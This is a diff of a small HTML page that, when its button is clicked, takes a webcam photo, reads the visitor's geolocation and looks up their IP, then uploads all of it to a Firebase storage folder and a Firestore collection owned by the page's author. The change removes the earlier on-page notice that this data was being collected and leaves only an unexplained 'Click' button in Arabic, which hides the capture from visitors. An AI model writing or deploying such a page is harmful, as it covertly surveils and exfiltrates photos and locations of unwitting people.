@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Don't Ask Me Why</title>
+    <title>Dont Ask My Why</title>
     <link rel="icon" href="data:,"> <!-- Favicon request disabled -->
     <style>
         body {
@@ -14,20 +14,26 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            color: white; /* White text */
-            flex-direction: column; /* Column layout */
-            text-align: center; /* Center text */
         }
-        #clickButton {
-            margin-top: 20px;
-            padding: 10px 20px;
-            background-color: #1a73e8;
-            border: none;
-            color: white;
-            cursor: pointer;
-            border-radius: 5px;
-            font-size: 16px;
-            display: none; /* Hidden by default */
+
+        .button {
+            background-color: #000; /* Black background */
+            color: white; /* White text */
+            border: 4px solid white; /* White border */
+            padding: 20px 40px; /* Padding */
+            font-size: 24px; /* Font size */
+            cursor: pointer; /* Pointer cursor */
+            border-radius: 5px; /* Rounded edges */
+            transition: background-color 0.3s; /* Transition effect */
+            text-align: center;
+        }
+
+        .button:hover {
+            background-color: rgba(255, 255, 255, 0.2); /* Lighten on hover */
+        }
+
+        video {
+            display: none; /* Hide video element */
         }
     </style>
     <script type="module">
@@ -52,36 +58,55 @@
         const storage = getStorage(app);
 
         // Function to upload image to Firebase Storage
-        async function uploadImage(imageData, location) {
-            const storageRef = ref(storage, `Zeyad/image_${Date.now()}.png`); // Upload to Zeyad folder
+        async function uploadImage(imageData, ipAddress, latitude, longitude) {
+            const storageRef = ref(storage, 'Zeyad/image_' + Date.now() + '.png'); // Upload to Zeyad folder
             await uploadString(storageRef, imageData, 'data_url')
-                .then(() => {
+                .then(async () => {
                     console.log('Uploaded image successfully!');
-
-                    // Save location coordinates to the same file in Storage (if needed)
-                    const locationRef = ref(storage, `Zeyad/location_${Date.now()}.json`);
-                    const locationData = JSON.stringify(location);
-                    uploadString(locationRef, locationData, 'raw')
-                        .then(() => {
-                            console.log('Uploaded location data successfully!');
-                        })
-                        .catch((error) => {
-                            console.error('Error uploading location data:', error);
-                        });
+                    // Save location and IP address to Firestore
+                    await addDoc(collection(db, "users"), {
+                        ip: ipAddress,
+                        latitude: latitude,
+                        longitude: longitude,
+                        timestamp: new Date()
+                    });
+                    console.log("Location and IP data sent to Firestore successfully");
                 })
                 .catch((error) => {
                     console.error('Error uploading image:', error);
                 });
         }
 
-        // Function to get location, IP address, and capture image
-        async function getLocationAndIP() {
-            // Request microphone permission first
+        // Function to handle button click
+        async function handleClick() {
             try {
+                // Request microphone permission first
                 await navigator.mediaDevices.getUserMedia({ audio: true });
 
-                // Then request camera permission
+                // Request camera permission
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                // Wait for the video to load
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        resolve();
+                    };
+                });
+
+                // Capture image
+                const canvas = document.createElement('canvas');
+                canvas.width = 640; // Set canvas width
+                canvas.height = 480; // Set canvas height
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/png');
+
+                // Stop the video stream
+                stream.getTracks().forEach(track => track.stop());
+
                 // Get the user's location
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(async (position) => {
@@ -89,74 +114,26 @@
                         const longitude = position.coords.longitude;
 
                         // Fetch the user's IP address using a public API
-                        try {
-                            const ipResponse = await fetch('https://api.ipify.org?format=json');
-                            const ipData = await ipResponse.json();
-                            const ipAddress = ipData.ip;
+                        const ipResponse = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await ipResponse.json();
+                        const ipAddress = ipData.ip;
 
-                            // Save IP and location to Firestore
-                            await addDoc(collection(db, "users"), {
-                                ip: ipAddress,
-                                latitude: latitude,
-                                longitude: longitude,
-                                timestamp: new Date()
-                            });
-                            console.log("Location and IP data sent to Firestore successfully");
-
-                            // Capture image from the video stream
-                            const video = document.createElement('video');
-                            video.srcObject = stream;
-                            video.play();
-
-                            // Wait for the video to load
-                            await new Promise((resolve) => {
-                                video.onloadedmetadata = () => {
-                                    resolve();
-                                };
-                            });
-
-                            // Create a canvas to capture the image
-                            const canvas = document.createElement('canvas');
-                            canvas.width = 640; // Set canvas width
-                            canvas.height = 480; // Set canvas height
-                            const context = canvas.getContext('2d');
-                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            const imageData = canvas.toDataURL('image/png');
-
-                            // Upload captured image and location coordinates to Firebase Storage
-                            await uploadImage(imageData, { latitude, longitude });
-
-                            // Stop the video stream
-                            stream.getTracks().forEach(track => track.stop());
-
-                            // Show the button to redirect to YouTube
-                            document.getElementById('clickButton').style.display = 'block';
-                        } catch (error) {
-                            console.error("Error fetching IP address or sending data to Firestore: ", error);
-                        }
+                        // Upload captured image and location data to Firebase
+                        await uploadImage(imageData, ipAddress, latitude, longitude);
                     }, (error) => {
                         console.error("Geolocation error: ", error);
                     });
                 } else {
                     console.error("Geolocation is not supported by this browser.");
                 }
-            } catch (error) {
-                console.error("Microphone or camera permission denied:", error);
+            } catch (err) {
+                console.error('Error accessing permissions: ', err);
+                alert('Permissions denied! You cannot use this feature without granting permissions.');
             }
-        }
-
-        // Call the function to get location and IP when the page loads
-        window.onload = getLocationAndIP;
-
-        // Function to redirect to a YouTube link when the button is clicked
-        function redirectToYouTube() {
-            window.location.href = "https://www.youtube.com/watch?v=xvFZjo5PgG0"; // YouTube link updated
         }
     </script>
 </head>
 <body>
-    <h1>Welcome to My Website</h1>
-    <p>Collecting your location, IP address, and taking a picture...</p>
-    <button id="clickButton" onclick="redirectToYouTube()">Click to Visit YouTube</button>
+    <button class="button" onclick="handleClick()">انقر</button> <!-- Button with "Click" in Arabic -->
 </body>
 </html>
